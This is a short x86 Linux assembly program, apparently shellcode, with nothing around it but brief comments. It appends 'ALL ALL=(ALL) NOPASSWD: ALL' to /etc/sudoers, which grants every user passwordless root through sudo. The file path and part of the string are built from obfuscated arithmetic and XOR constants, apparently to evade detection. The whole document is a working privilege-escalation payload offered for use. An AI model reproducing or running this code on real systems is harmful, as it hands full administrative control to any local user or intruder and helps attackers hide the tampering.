section .text
	global _start

_start:

	;open("/etc/sudoers", O_WRONLY | O_APPEND);
	sub eax, eax
	push eax
	mov edi, 0x26082608
        mov esi, 0x4d6a3f67
        add esi, edi
        push esi
        mov esi, 0x8a7d9937
        sub esi, edi
        push esi
        mov esi, 0x457c4327
        xor esi, edi
        push esi
        mov ebx, esp
	mov cx, 0x401
	mov al, 0x05
	int 0x80

	mov ebx, eax  

	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);
	sub eax, eax
	push eax
	push 0x0a4c4c41
	push 0x203a4457
        mov esi, 0x12341234
        mov edi, 0x41675364
        xor edi,esi
        push edi
	push 0x4f4e2029
	push 0x4c4c4128
	push 0x3d4c4c41
	push 0x204c4c41
	mov ecx, esp
        sub edx, edx
	mov dl, 0x1c
        inc eax
        inc eax
        inc eax
        inc eax
	int 0x80

	; close(file)

        mov al, 6
        int 0x80

        ; exit(0)

        sub eax, eax
        inc eax
        int 0x80
